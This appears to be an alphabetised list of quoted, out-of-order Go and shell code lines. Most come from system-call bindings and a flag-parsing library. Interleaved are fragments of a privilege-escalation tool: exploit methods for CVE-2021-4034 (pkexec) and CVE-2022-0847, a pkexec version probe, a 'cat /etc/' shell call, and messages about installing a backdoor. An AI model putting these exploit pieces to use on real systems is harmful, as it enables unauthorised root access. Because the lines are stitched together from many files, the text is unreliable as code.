"convertStringSecurityDescriptorToSecurityDescriptor(str string, revision uint32, sd "
"copied := copy(out, buf[0:])"
"copies of the Software, and to permit persons to whom the Software is"
"copy(a, s)"
"copy(aclBytes, ("
"copy(addr[:], v)"
"copy(bs[:len(bs)-1], val)"
"copy(buf, s)"
"copy(buf[0:], data)"
"copy(buf[:], ""urn:uuid:"")"
"copy(buf[dstPos:], ("
"copy(buf[hdrSize:], handle)"
"copy(data.description[:], str)"
"copy(data.mfgName[:], str)"
"copy(data.providerName[:], str)"
"copy(data.remoteMachineName[:], str)"
"copy(dst, src)"
"copy(dst.AlternateFileName[:], src.AlternateFileName[:])"
"copy(dst.FileName[:], src.FileName[:])"
"copy(dstDirent.Name[:], srcDirent.Name[:srcDirent.Namlen])"
"copy(ifr.Ifrn[:], name)"
"copy(ifreq.Name[:], ifname)"
"copy(left, cs)"
"copy(newLine, t.line)"
"copy(nodeID[:], addr)"
"copy(nodeID[:], id)"
"copy(node[:], uuid[10:])"
"copy(nu.UUID[:], data)"
"copy(out[:], ("
"copy(params.driverPath[:], str)"
"copy(result, v.segments)"
"copy(right, c)"
"copy(s.Fstypename[:], old.Fstypename[:n])"
"copy(s.Mntfromname[:], old.Mntfromname[:n])"
"copy(s.Mntonname[:], old.Mntonname[:n])"
"copy(sa.raw.Name[:], name)"
"copy(sa.raw.Service_name[:], sa.ServiceName)"
"copy(sa.raw.Type[:], typ)"
"copy(sa.raw[14:], sa.Dev)"
"copy(sa.raw[8:14], sa.Remote)"
"copy(t.line[t.pos:], t.line[n"
"copy(uuid[10:], nodeID[:])"
"copy(uuid[:], data)"
"copy(uuid[:], pool[poolPos:(poolPos"
"copy(uuid[:], s)"
"copyFindData(data, "
"copyStat(sta, "
"copyStat(stat, "
"copyright notice, this list of conditions and the following disclaimer"
"countValue, "
"create(path string, mode int, perm uint32) (fd int, err error)"
"createWellKnownSid(sidType WELL_KNOWN_SID_TYPE, domainSid "
"csStr := make([]string, len(cs))"
"cs[i], cs[j] = cs[j], cs[i]"
"ctl, int ctllen, void "
"ctx, cancel := context.WithTimeout(context.Background(), delayTime)"
"ctx, long "
"curoffset, e := Seek(fd, 0, 1)"
"cursorX, cursorY int"
"cve20214034Exploit) Exploit(ctx context.Context, s "
"cve20214034Exploit) IsVulnerable(ctx context.Context, s "
"cve20214034Exploit) Shell(ctx context.Context, s "
"cve20214034Exploit) writeSharedObject(path string, aggro bool, log logger.Logger) error {"
"cve20220847Exploit) Exploit(ctx context.Context, s "
"cve20220847Exploit) IsVulnerable(ctx context.Context, s "
"cve20220847Exploit) Shell(ctx context.Context, s "
"cve20220847Exploit) writeToFile(path string, offset int64, data []byte) error {"
"d := initxattrdest(dest, 0)"
"d := make([][]int, len(s)"
"d = initxattrdest(dest, s)"
"d, e := LoadDLL(name)"
"d, err := fdopendir(fd2)"
"d, err := strconv.ParseInt(b, 0, 0)"
"d, nil"
"d.Atime, b = gbit32(b)"
"d.Dev, b = gbit32(b)"
"d.Mode, b = gbit32(b)"
"d.Mtime, b = gbit32(b)"
"d.Qid.Path, b = gbit64(b)"
"d.Qid.Type, b = gbit8(b)"
"d.Qid.Vers, b = gbit32(b)"
"d.Type, b = gbit16(b)"
"d.dll)), unsafe.Pointer(dll))"
"d[i] = make([]int, len(t)"
"dacl, "
"daclSize, nil, "
"daclSize, sacl, "
"data, err := cmd.Output()"
"data, err := exec.Command(""pkexec"", ""--version"").Output()"
"data, err := exec.Command(""sh"", ""-c"", ""cat /etc/"
"data, err := ioutil.ReadAll(resp.Body)"
"data, int bytes)"
"data, not as the return value."
"data, size_t data_len)"
"data, size_t nbytes)"
"data, u_int length)"
"data.hardwareID[0], int(len), int(len)}"
"data: p,"
"dataType, "
"data[0])),"
"datap, err := BytePtrFromString(data)"
"db := make([]uint16, dn)"
"db[0], "
"defer Seek(fd, curoffset, 0)"
"defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort."
"defer func() { fmt.Println("""") }()"
"defer term.Restore(int(os.Stdin.Fd()), oldState)"
"defer unix.IoctlSetTermios(fd, ioctlWriteTermios, termios)"
"defer windows.SetConsoleMode(windows.Handle(fd), old)"
"define FS_KEY_DESC_PREFIX              ""fscrypt:"""
"define roundup(x, y)   ((((x)"
"define"" "
"delete(e.cookies, "
"delete(e.cookies, cookie)"
"delete(e.fds, fd)"
"delete(e.fds, peExt.Fd)"
"delete(e.paths, path)"
"delete(e.paths, peExt.Path)"
"delete(ep.fds, fd)"
"delete(f.actual, fname)"
"delete(f.formal, fname)"
"delete(m.active, p)"
"delta, struct timeval "
"desc,"
"dev, err := ptsdev(f.Fd())"
"deviceDescriptionUTF16, err = UTF16PtrFromString(deviceDescription)"
"deviceID16, err := UTF16PtrFromString(deviceID)"
"deviceNameUTF16, err := UTF16PtrFromString(deviceName)"
"dim:       """
"dir, _, e := syscall_syscall(SYS___OPENDIR_A, uintptr(unsafe.Pointer(p)), 0, 0)"
"dir, err := os.MkdirTemp(os.TempDir(), ""traitor"")"
"directives = append(directives, ""ShellCompDirectiveDefault"")"
"directives = append(directives, ""ShellCompDirectiveError"")"
"directives = append(directives, ""ShellCompDirectiveFilterDirs"")"
"directives = append(directives, ""ShellCompDirectiveFilterFileExt"")"
"directives = append(directives, ""ShellCompDirectiveNoFileComp"")"
"directives = append(directives, ""ShellCompDirectiveNoSpace"")"
"directory, and the build is coordinated by the "
"distribute this software, either in source code form or as a compiled"
"distributed under the License is distributed on an ""AS IS"" BASIS,"
"dll, err = LoadDLL(d.Name)"
"dll, err = loadLibraryEx(d.Name, d.System)"
"dn, "
"documentation files (the ""Software""), to deal in the"
"done < ""$knownfolders"""
"done < ""$ntstatus"""
"done < ""$winerror"""
"done, nil)"
"dstaddr, long "
"dup2(int from, int to)"
"dup3(int from, int to, int flags)"
"durationSliceValue) fromString(val string) (time.Duration, error) {"
"e := ConvertSidToStringSid(sid, "
"e := CopySid(uint32(len(b)), sid2, sid)"
"e := GetTokenInformation(t, class, "
"e := GetUserProfileDirectory(t, "
"e := LookupAccountSid(sys, sid, "
"e := ReadFile(fd, p, "
"e := WriteFile(fd, p, "
"e := fd2path(fd, buf[:])"
"e := readdir_r(d, "
"e = ConvertStringSidToSid(p, "
"e = LookupAccountName(sys, acc, sid, "
"e = TranslateName(u, from, to, "
"e, _, _ := syscall_syscall(SYS___READDIR_R_A, dir, uintptr(unsafe.Pointer("
"e.peIntToExt(pe, p)"
"echo ""$key $vtype = $value"""
"echo ""$mksyscall -tags $GOOS,$GOARCH $syscall_goos $GOOSARCH_in "
"echo ""$mksyscall -tags $GOOS,$GOARCH,go1.12 $syscall_goos $GOOSARCH_in "
"echo ""$mksyscall -tags $GOOS,$GOARCH,go1.13 syscall_darwin.1_13.go "
"echo ""$mksyscall -tags solaris,$GOARCH syscall_solaris.go syscall_solaris_$GOARCH.go "
"echo ""${!indirect} $includes"" "
"echo ""${!indirect} $includes"""
"echo ""${BASH_REMATCH[1]} NTStatus = ${BASH_REMATCH[2]}"""
"echo "")"""
"echo ""// "
"echo ""// Code generated by 'mkerrors.bash'"
"echo ""// Code generated by 'mkknownfolderids.bash'"
"echo ""//go:build ${GOARCH} "
"echo ""<red>this text is <bold>red</bold></red> and the following is <green>not red</green>"" "
"echo ""autoload -U compinit"
"echo ""const ("""
"echo ""import "
"echo ""package windows"""
"echo ""type KNOWNFOLDERID GUID"""
"echo ""var ("""
"echo '// mkerrors.sh' ""$@"""
"echo 'import ""C""'"
"echo 'import ""syscall""'"
"echo 'undefined $GOOS_$GOARCH:' ""$GOOSARCH"" 1>"
"echo 'unrecognized $GOOS_$GOARCH: ' ""$GOOSARCH"" 1>"
"echo -E """
"echo2 ""  - darwin/386"""
"echo2 ""  - darwin/arm"""
"echo2 ""  - linux/amd64"""
"echo2 ""  - linux/riscv"""
"echo2 ""Build for darwin (32bits)."""
"echo2 ""Build for linux - go1.6."""
"echo2 ""Build for linux."""
"echo:         true,"
"echoTimes, ""times"", ""t"", 1, ""times to echo the input"")"
"egid, gid_t "
"elif [ ""$GOOS"" == ""darwin"" ]"
"elif [ ""$GOOS"" == ""illumos"" ]"
"encodeHex(buf[9:], uuid)"
"encodeHex(buf[:], uuid)"
"encodeHex(js[:], uuid)"
"ent)), uintptr(unsafe.Pointer("
"ent, err"
"entry, "
"entry, err := state.SudoEntries.GetEntryForBinary("
"entry, nil"
"entry, ok := t.history.NthPreviousEntry(t.historyIndex "
"entry, ok := t.history.NthPreviousEntry(t.historyIndex - 1)"
"entry.AllCommands = entry.Command == ""ALL"""
"entry.AllHosts = entry.Hostname == ""ALL"""
"entry.AllUsers = entry.UserName == ""ALL"""
"enum { A = 'A', Z = 'Z', a = 'a', z = 'z' }"
"enumeratorUTF16, err = UTF16PtrFromString(enumerator)"
"env = append(env, entry)"
"envs:           envs,"
"envv, struct mac "
"ep, ok := e.epfd2ep[epfd]"
"epollImpl) epollcreate(size int) (epfd int, err error) {"
"epollImpl) epollcreate1(flag int) (fd int, err error) {"
"epollImpl) epollctl(epfd int, op int, fd int, event "
"epollImpl) epollwait(epfd int, events []EpollEvent, msec int) (n int, err error) {"
"err := FcntlFlock(uintptr(fd), fcntl_cmd, "
"err := GetTokenInformation(token, TokenElevation, ("
"err := GetTokenInformation(token, TokenLinkedToken, ("
"err := Getsockopt(fd, int32(level), int32(opt), ("
"err := OpenProcessToken(CurrentProcess(), TOKEN_QUERY, "
"err := Prlimit(0, resource, nil, rlim)"
"err := Prlimit(0, resource, rlim, nil)"
"err := Tcgetattr(fd, "
"err := Tcsetattr(fd, int(req), value)"
"err := convertSecurityDescriptorToStringSecurityDescriptor(sd, 1, 0xff, "
"err := createWellKnownSid(sidType, domainSid, sid, "
"err := f(flags, "
"err := f.parseArgs(arguments, fn)"
"err := f.parseArgs(arguments, set)"
"err := fmt.Errorf(""flag accessed but not defined: %s"", name)"
"err := fmt.Errorf(""trying to get %s value of flag of type %s"", ftype, flag.Value.Type())"
"err := fmt.Errorf(format, a...)"
"err := fstat(fd, stat)"
"err := fstatat(dirfd, path, stat, flags)"
"err := getsockname(fd, "
"err := getsockopt(fd, level, opt, unsafe.Pointer("
"err := getsockopt(fd, level, opt, unsafe.Pointer(x), "
"err := initializeProcThreadAttributeList(nil, maxAttrCount, 0, "
"err := ioctl(f.Fd(), ioctl_FIODNAME, uintptr(unsafe.Pointer("
"err := ioctl(f.Fd(), syscall.TIOCGPTN, uintptr(unsafe.Pointer("
"err := ioctl(f.Fd(), syscall.TIOCPTYGNAME, uintptr(unsafe.Pointer("
"err := ioctl(fd, CTLIOCGINFO, uintptr(unsafe.Pointer(ctlInfo)))"
"err := ioctl(fd, SIOCGIFMTU, uintptr(unsafe.Pointer("
"err := ioctl(fd, SIOCSIFMTU, uintptr(unsafe.Pointer(ifreq)))"
"err := ioctl(fd, req, uintptr(unsafe.Pointer("
"err := ioctl(fd, req, uintptr(unsafe.Pointer(value)))"
"err := ioctl(fd, syscall.TIOCISPTMASTER, 0)"
"err := ioctl(fd, syscall.TIOCPTMASTER, 0)"
"err := ioctlPtr(fd, HIDIOCGRAWINFO, unsafe.Pointer("
"err := ioctlPtr(fd, RTC_RD_TIME, unsafe.Pointer("
"err := ioctlPtr(fd, RTC_WKALM_RD, unsafe.Pointer("
"err := ioctlPtr(fd, WDIOC_GETSUPPORT, unsafe.Pointer("
"err := ioctlPtr(fd, _HIDIOCGRAWNAME, unsafe.Pointer("
"err := ioctlPtr(fd, _HIDIOCGRAWPHYS, unsafe.Pointer("
"err := ioctlPtr(fd, _HIDIOCGRAWUNIQ, unsafe.Pointer("
"err := ioctlPtr(fd, req, unsafe.Pointer("
"err := ioctlPtr(srcFd, FIDEDUPERANGE, unsafe.Pointer("
"err := json.Unmarshal(data, "
"err := lstat(path, stat)"
"err := readFile(fd, p, done, overlapped)"
"err := setupDiGetDeviceInstanceId(deviceInfoSet, deviceInfoData, "
"err := setupDiGetDriverInfoDetail(deviceInfoSet, deviceInfoData, driverInfoData, data, uint32(len(buf)), "
"err := shGetKnownFolderPath(folderID, flags, t, "
"err := stat(path, statptr)"
"err := sysctl(mib, old, oldlen, nil, 0)"
"err := tmpl(c.OutOrStderr(), c.UsageTemplate(), c)"
"err := tmpl(c.OutOrStdout(), c.HelpTemplate(), c)"
"err := tmpl(c.OutOrStdout(), c.VersionTemplate(), c)"
"err := utimensat(AT_FDCWD, path, ("
"err := utimensat(AT_FDCWD, path, nil, 0)"
"err := windows.GetConsoleMode(windows.Handle(fd), "
"err := writeFile(fd, p, done, overlapped)"
"err = DeviceIoControl(fd, FSCTL_GET_REPARSE_POINT, nil, 0, "
"err = ExtattrDeleteFd(fd, nsid, a)"
"err = ExtattrDeleteFile(file, nsid, a)"
"err = ExtattrDeleteLink(link, nsid, a)"
"err = Fstatvfs(fd, "
"err = Prlimit(0, resource, nil, rlim)"
"err = Prlimit(0, resource, rlim, nil)"
"err = Process32Next(snapshot, "
"err = SetupDiSetDeviceRegistryProperty(deviceInfoSet, deviceInfoData, property, utf16ToBuf(append(str16, 0)))"
"err = buildSecurityDescriptor(owner, group, uint32(len(accessEntries)), firstAccessEntry, uint32(len(auditEntries)), firstAuditEntry, mergedSecurityDescriptor, "
"err = capRightsGet(capRightsGoVersion, int(fd), r)"
"err = clsidFromString(str16, "
"err = convertStringSecurityDescriptorToSecurityDescriptor(sddl, 1, "
"err = errors.New(""cannot parse major version number returned by uname"")"
"err = errors.New(""cannot parse minor version number returned by uname"")"
"err = f.failf(""bad flag syntax: %s"", s)"
"err = f.failf(""flag needs an argument: %q in -%s"", c, shorthands)"
"err = f.failf(""flag needs an argument: %s"", s)"
"err = f.failf(""unknown flag: --%s"", name)"
"err = f.failf(""unknown shorthand flag: %q in -%s"", c, shorthands)"
"err = findNextFile1(handle, "
"err = fmt.Errorf(""CreateToolhelp32Snapshot: %v"", e1)"
"err = fmt.Errorf(""Process32First: %v"", e1)"
"err = fmt.Errorf(""Process32Next: %v"", e1)"
"err = fn(flag, value)"
"err = fstat(fd, "
"err = fstat(fd, st)"
"err = fstatat(dirfd, path, st, flags)"
"err = fstatat(fd, path, "
"err = fstatfs(fd, "
"err = getNamedSecurityInfo(objectName, objectType, securityInformation, nil, nil, nil, nil, "
"err = getSecurityDescriptorControl(sd, "
"err = getSecurityDescriptorDacl(sd, "
"err = getSecurityDescriptorGroup(sd, "
"err = getSecurityDescriptorOwner(sd, "
"err = getSecurityDescriptorRMControl(sd, "
"err = getSecurityDescriptorSacl(sd, "
"err = getSecurityInfo(handle, objectType, securityInformation, nil, nil, nil, nil, "
"err = getrlimit(resource, "
"err = getrusage(who, "
"err = getsockopt(fd, level, opt, unsafe.Pointer("
"err = gettimeofday(tv, nil)"
"err = initializeProcThreadAttributeList(al.data, maxAttrCount, 0, "
"err = initializeSecurityDescriptor(absoluteSD, 1)"
"err = ioctlIfreqData(fd, SIOCETHTOOL, "
"err = lstat(path, "
"err = lstat(path, st)"
"err = makeAbsoluteSD(selfRelativeSD, absoluteSD, "
"err = makeAbsoluteSD(selfRelativeSD, nil, "
"err = makeSelfRelativeSD(absoluteSD, nil, "
"err = makeSelfRelativeSD(absoluteSD, selfRelativeSD, "
"err = nameToHandleAt(dirfd, path, fh, "
"err = pledgeAvailable(maj, min, """")"
"err = pledgeAvailable(maj, min, execpromises)"
"err = ptrace(PTRACE_GETEVENTMSG, pid, 0, uintptr(unsafe.Pointer("
"err = ptrace(PTRACE_IO, pid, uintptr(unsafe.Pointer("
"err = ptrace(peekReq, pid, addr"
"err = ptrace(peekReq, pid, addr-addr%SizeofPtr, uintptr(unsafe.Pointer("
"err = ptrace(pokeReq, pid, addr"
"err = ptrace(pokeReq, pid, addr-addr%SizeofPtr, word)"
"err = ptrace(req, pid, addr"
"err = ptrace(req, pid, addr-addr%SizeofPtr, uintptr(unsafe.Pointer("
"err = sendfile(infd, outfd, "
"err = setEntriesInAcl(uint32(len(explicitEntries)), firstExplicitEntry, mergedACL, "
"err = setupDiClassGuidsFromNameEx(classNameUTF16, "
"err = setupDiClassNameFromGuidEx(classGUID, "
"err = setupDiGetDeviceProperty(deviceInfoSet, deviceInfoData, propertyKey, "
"err = setupDiGetDeviceRegistryProperty(deviceInfoSet, deviceInfoData, property, "
"err = socketpair(domain, typ, proto, "
"err = stat(path, "
"err = stat(path, st)"
"err = statfs(path, "
"err = syscall.Process32Next(snapshot, "
"err = unmount(b2s(buffer.fsinfo[i].Fsname[:]), mtm)"
"errChan := make(chan error, 1)"
"errno := getsockopt(fd, level, opt, unsafe.Pointer("
"errorHandling: errorHandling,"
"errors[""$key""]=""$value"""
"errorspkg ""errors"""
"euid, uid_t "
"eventPoll),"
"eventlist, int nevents, const struct timespec "
"eventlist, size_t nevents, const struct timespec "
"events[i] = EpollEvent{Fd: pFd.Fd, Events: pToEpollEvt(pFd.Revents)}"
"evp, int "
"evp, timer_t "
"ex, const struct timespec "
"ex, struct timeval "
"exec.Cmd, sz "
"exec.Cmd, ws "
"exit(SB),NOSPLIT,$4-4"
"exit(SB),NOSPLIT,$8-8"
"exploit) Exploit(ctx context.Context, s "
"exploit) IsVulnerable(_ context.Context, s "
"exploit) Shell(ctx context.Context, s "
"exploit) installPackage(name string, s "
"exploitLogger.Printf(""Gathering information..."")"
"exploitLogger.Printf(""No local exploit available for '%s'"", exploit.Name)"
"exploitLogger.Printf(""Opportunity found, trying to exploit it..."")"
"exploitLogger.Printf(""Session complete."")"
"exploitLogger.Printf(""System is not vulnerable to '%s' - cannot exploit."", exploit.Name)"
"exploitLogger.Printf(""System is vulnerable! Run again with '--exploit %s' to exploit it."", exploit.Name)"
"exploitName, ""exploit"", ""e"", exploitName, ""Run the specified exploit, if the system is found to be vulnerable. Provides a shell where possible."")"
"exptr, err := syscall.BytePtrFromString(execpromises)"
"ext = ""_filedir -d"""
"ext = ""_filedir"""
"ext = fmt.Sprintf(""__%s_handle_filename_extension_flag "", cmd.Root().Name()) "
"ext = fmt.Sprintf(""__%s_handle_subdirs_in_dir_flag "", cmd.Root().Name()) "
"extattr_delete_fd(int fd, int attrnamespace, const char "
"extattr_get_fd(int fd, int attrnamespace, const char "
"extattr_list_fd(int fd, int attrnamespace, void "
"extattr_set_fd(int fd, int attrnamespace, const char "
"extn"""
"extpread(fd int, p []byte, flags int, offset int64) (n int, err error)"
"extpwrite(fd int, p []byte, flags int, offset int64) (n int, err error)"
"f := os.NewFile(uintptr(h), ""stdin"")"
"f), 'g', -1, 32) }"
"f), 'g', -1, 64) }"
"f, _ := os.Open(""/tmp/linux-4.10-rc7.tar.xz"")"
"f, err := os.OpenFile(path,"
"f, err := pty.Start(c)"
"f, int op, int val, const struct timespec "
"f, ok := e.paths[path]"
"f.BoolVarP(p, name, """", value, usage)"
"f.BoolVarP(p, name, shorthand, value, usage)"
"f.BytesBase64VarP(p, name, """", value, usage)"
"f.BytesBase64VarP(p, name, shorthand, value, usage)"
"f.BytesHexVarP(p, name, """", value, usage)"
"f.BytesHexVarP(p, name, shorthand, value, usage)"
"f.CountVarP(p, name, """", usage)"
"f.CountVarP(p, name, shorthand, usage)"
"f.DurationVarP(p, name, """", value, usage)"
"f.DurationVarP(p, name, shorthand, value, usage)"
"f.Float32VarP(p, name, """", value, usage)"
"f.Float32VarP(p, name, shorthand, value, usage)"
"f.Float64VarP(p, name, """", value, usage)"
"f.Float64VarP(p, name, shorthand, value, usage)"
"f.IPMaskVarP(p, name, """", value, usage)"
"f.IPMaskVarP(p, name, shorthand, value, usage)"
"f.IPNetVarP(p, name, """", value, usage)"
"f.IPNetVarP(p, name, shorthand, value, usage)"
"f.IPVarP(p, name, """", value, usage)"
"f.IPVarP(p, name, shorthand, value, usage)"
"f.Int16VarP(p, name, """", value, usage)"
"f.Int16VarP(p, name, shorthand, value, usage)"
"f.Int32VarP(p, name, """", value, usage)"
"f.Int32VarP(p, name, shorthand, value, usage)"
"f.Int64VarP(p, name, """", value, usage)"
"f.Int64VarP(p, name, shorthand, value, usage)"
"f.Int8VarP(p, name, """", value, usage)"
"f.Int8VarP(p, name, shorthand, value, usage)"
"f.IntVarP(p, name, """", value, usage)"
"f.IntVarP(p, name, shorthand, value, usage)"
"f.Name, ""["""
"f.StringVarP(p, name, """", value, usage)"
"f.StringVarP(p, name, shorthand, value, usage)"
"f.Uint16VarP(p, name, """", value, usage)"
"f.Uint16VarP(p, name, shorthand, value, usage)"
"f.Uint32VarP(p, name, """", value, usage)"
"f.Uint32VarP(p, name, shorthand, value, usage)"
"f.Uint64VarP(p, name, """", value, usage)"
"f.Uint64VarP(p, name, shorthand, value, usage)"
"f.Uint8VarP(p, name, """", value, usage)"
"f.Uint8VarP(p, name, shorthand, value, usage)"
"f.UintVarP(p, name, """", value, usage)"
"f.UintVarP(p, name, shorthand, value, usage)"
"f.VarP(newBoolSliceValue(value, p), name, """", usage)"
"f.VarP(newBoolSliceValue(value, p), name, shorthand, usage)"
"f.VarP(newBytesBase64Value(value, p), name, """", usage)"
"f.VarP(newBytesBase64Value(value, p), name, shorthand, usage)"
"f.VarP(newBytesHexValue(value, p), name, """", usage)"
"f.VarP(newBytesHexValue(value, p), name, shorthand, usage)"
"f.VarP(newDurationSliceValue(value, p), name, """", usage)"
"f.VarP(newDurationSliceValue(value, p), name, shorthand, usage)"
"f.VarP(newDurationValue(value, p), name, """", usage)"
"f.VarP(newDurationValue(value, p), name, shorthand, usage)"
"f.VarP(newFloat32SliceValue(value, p), name, """", usage)"
"f.VarP(newFloat32SliceValue(value, p), name, shorthand, usage)"
"f.VarP(newFloat32Value(value, p), name, """", usage)"
"f.VarP(newFloat32Value(value, p), name, shorthand, usage)"
"f.VarP(newFloat64SliceValue(value, p), name, """", usage)"
"f.VarP(newFloat64SliceValue(value, p), name, shorthand, usage)"
"f.VarP(newFloat64Value(value, p), name, """", usage)"
"f.VarP(newFloat64Value(value, p), name, shorthand, usage)"
"f.VarP(newIPMaskValue(value, p), name, """", usage)"
"f.VarP(newIPMaskValue(value, p), name, shorthand, usage)"
"f.VarP(newIPNetValue(value, p), name, """", usage)"
"f.VarP(newIPNetValue(value, p), name, shorthand, usage)"
"f.VarP(newIPSliceValue(value, p), name, """", usage)"
"f.VarP(newIPSliceValue(value, p), name, shorthand, usage)"
"f.VarP(newIPValue(value, p), name, """", usage)"
"f.VarP(newIPValue(value, p), name, shorthand, usage)"
"f.VarP(newInt16Value(value, p), name, """", usage)"
"f.VarP(newInt16Value(value, p), name, shorthand, usage)"
"f.VarP(newInt32SliceValue(value, p), name, """", usage)"
"f.VarP(newInt32SliceValue(value, p), name, shorthand, usage)"
"f.VarP(newInt32Value(value, p), name, """", usage)"
"f.VarP(newInt32Value(value, p), name, shorthand, usage)"
"f.VarP(newInt64SliceValue(value, p), name, """", usage)"
"f.VarP(newInt64SliceValue(value, p), name, shorthand, usage)"
"f.VarP(newInt64Value(value, p), name, """", usage)"
"f.VarP(newInt64Value(value, p), name, shorthand, usage)"
"f.VarP(newInt8Value(value, p), name, """", usage)"
"f.VarP(newInt8Value(value, p), name, shorthand, usage)"
"f.VarP(newIntSliceValue(value, p), name, """", usage)"
"f.VarP(newIntSliceValue(value, p), name, shorthand, usage)"
"f.VarP(newIntValue(value, p), name, """", usage)"
"f.VarP(newIntValue(value, p), name, shorthand, usage)"
"f.VarP(newStringArrayValue(value, p), name, """", usage)"
"f.VarP(newStringArrayValue(value, p), name, shorthand, usage)"
"f.VarP(newStringSliceValue(value, p), name, """", usage)"
"f.VarP(newStringSliceValue(value, p), name, shorthand, usage)"
"f.VarP(newStringToInt64Value(value, p), name, """", usage)"
"f.VarP(newStringToInt64Value(value, p), name, shorthand, usage)"
"f.VarP(newStringToIntValue(value, p), name, """", usage)"
"f.VarP(newStringToIntValue(value, p), name, shorthand, usage)"
"f.VarP(newStringToStringValue(value, p), name, """", usage)"
"f.VarP(newStringToStringValue(value, p), name, shorthand, usage)"
"f.VarP(newStringValue(value, p), name, """", usage)"
"f.VarP(newStringValue(value, p), name, shorthand, usage)"
"f.VarP(newUint16Value(value, p), name, """", usage)"
"f.VarP(newUint16Value(value, p), name, shorthand, usage)"
"f.VarP(newUint32Value(value, p), name, """", usage)"
"f.VarP(newUint32Value(value, p), name, shorthand, usage)"
"f.VarP(newUint64Value(value, p), name, """", usage)"
"f.VarP(newUint64Value(value, p), name, shorthand, usage)"
"f.VarP(newUint8Value(value, p), name, """", usage)"
"f.VarP(newUint8Value(value, p), name, shorthand, usage)"
"f.VarP(newUintSliceValue(value, p), name, """", usage)"
"f.VarP(newUintSliceValue(value, p), name, shorthand, usage)"
"f.VarP(newUintValue(value, p), name, """", usage)"
"f.VarP(newUintValue(value, p), name, shorthand, usage)"
"f.VarP(value, name, """", usage)"
"f.VarPF(value, name, shorthand, usage)"
"f.Write([]byte(""bar"
"f.Write([]byte(""baz"
"f.Write([]byte(""foo"
"f.addedGoFlagSets = append(f.addedGoFlagSets, newSet)"
"f.args = append(f.args, args...)"
"f.args = append(f.args, s)"
"f.args = make([]string, 0, len(arguments))"
"f.orderedActual = append(f.orderedActual, flag)"
"f.orderedFormal = append(f.orderedFormal, flag)"
"f:        cop.f,"
"faccessat(dirfd int, path string, mode uint32) (err error)"
"faccessat(int fd, const char "
"fail(""Error requesting binary path: %s"", err)"
"fail(""Error requesting binary stat: %s"", err)"
"fail(""Error: %s"", err)"
"fail(""Error: the traitor binary does not have the setuid bit set: %o"", stat.Mode())"
"fail(""Failed to determine executable path: %s"", err)"
"fail(""Failed to install backdoor: %s"", err)"
"fail(""Failed to remove backdoor: %s"", err)"
"fail(""Failed to stat path: %s"", err)"
"fail(""Not a backdoor."")"
"fanotifyMark(fd int, flags uint, mask uint64, dirFd int, pathname "
"fchflags(int fd, u_long flags)"
"fchmod(int fd, mode_t mode)"
"fchmodat(dirfd int, path string, mode uint32) (err error)"
"fchmodat(int fd, const char "
"fchown(int fd, uid_t uid, gid_t gid)"
"fchownat(int fd, const char "
"fcntl(fd int, cmd int, arg int) (val int, err error)"
"fcntl(int fd, int cmd, ... void "
"fd, _ := Socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM)"
"fd, _ := Socket(AF_CAN, SOCK_RAW, CAN_RAW)"
"fd, _ := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)"
"fd, _, err := RawSyscall(SYS_SOCKETCALL, netSocket, uintptr(unsafe.Pointer("
"fd, _, err := RawSyscall(SYS_SOCKETCALL, uintptr(call), uintptr(unsafe.Pointer("
"fd, _, err := Syscall(SYS_SOCKETCALL, netAccept4, uintptr(unsafe.Pointer("
"fd, _, err := Syscall(SYS_SOCKETCALL, uintptr(call), uintptr(unsafe.Pointer("
"fd, e := Open(path, O_RDONLY)"
"fd, e := rawsocketcall(_SOCKET, uintptr(domain), uintptr(typ), uintptr(proto), 0, 0, 0)"
"fd, e := socketcall(_ACCEPT4, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), uintptr(flags), 0, 0)"
"fd, err := Create(path, O_RDONLY, DMDIR"
"fd, err := CreateFile(StringToUTF16Ptr(path), GENERIC_READ, 0, nil, OPEN_EXISTING,"
"fd, err := open(""."", O_RDONLY)"
"fd, err := open(path, O_RDONLY, 0)"
"fd, err := posixOpenpt(syscall.O_RDWR "
"fd, err = socket(domain, typ, proto)"
"fd2, err := Openat(fd, ""."", O_RDONLY, 0)"
"fd2path(fd int, buf []byte) (err error)"
"fdp, int flags)"
"fds := make([]int, len(ep.fds))"
"fds := make([]int, len(m.Data)>>2)"
"fds = append(fds, fd)"
"fds, u_int nfds, const struct timespec "
"fds, u_int nfds, int timeout)"
"fds[0], len(fds), timeout)"
"fds[0], len(fds), timeout, sigmask)"
"fexecve(int fd, char "
"fgetxattr(fd int, attr string, dest "
"fgetxattr(int fd, const char "
"fhp, int flags)"
"fhp, size_t "
"fhp, size_t fh_size, struct stat "
"fhp, struct stat "
"fhp, struct statfs "
"fildes, int flags)"
"file, err := os.Create(path)"
"fileHandle, flags int) (fd int, err error) = SYS_OPEN_BY_HANDLE_AT"
"fileHandle, flags int) (fd int, err error) {"
"fileHandle, mountID "
"fileObj, error) {"
"fileObjCookie),"
"fileObjCookie{fobj, cookie}"
"fileObjCookie{nil, cookie}"
"file_actions, const struct posix_spawnattr "
"filename, int attrnamespace, const char "
"fillStat_t(s, st)"
"finalCmd, completions, directive, err := cmd.getCompletions(args)"
"finalCmd, finalArgs, err = c.Root().Traverse(trimmedArgs)"
"finalCmd, finalArgs, err = rootCmd.Find(trimmedArgs)"
"findNextFile1(handle Handle, data "
"findResource(module Handle, name uintptr, resType uintptr) (resInfo Handle, err error) = kernel32.FindResourceW"
"fktrace(int fd, int ops, int facs, pid_t pid)"
"flag ""github.com/spf13/pflag"""
"flag := CommandLine.VarPF(newBoolValue(value, p), name, shorthand, usage)"
"flag := f.VarPF(newBoolValue(value, p), name, shorthand, usage)"
"flag := f.VarPF(newCountValue(0, p), name, shorthand, usage)"
"flag := findFlag(finalCmd, flagName)"
"flag, err := fcntl(fd, F_GETFL, 0)"
"flag, exists := f.formal[f.normalizeFlagName(name)]"
"flag, exists := f.shorthands[c]"
"flag, finalArgs, toComplete, flagErr := checkIfFlagCompletion(finalCmd, finalArgs, toComplete)"
"flag, ok := f.formal[normalName]"
"flag.Annotations[BashCompCustom] = []string{fmt.Sprintf(""__%[1]s_handle_go_custom_completion"", cmd.Root().Name())}"
"flag.Flag, annotation string, groupStatus map[string]map[string]bool) {"
"flag.FlagSet, flagnames ...string) bool {"
"flag.FlagSet, name string) flag.NormalizedName {"
"flag.FlagSet, name string) flag.NormalizedName"
"flag.FlagSet, name string) flag.NormalizedName) {"
"flag.FlagSet, pflag "
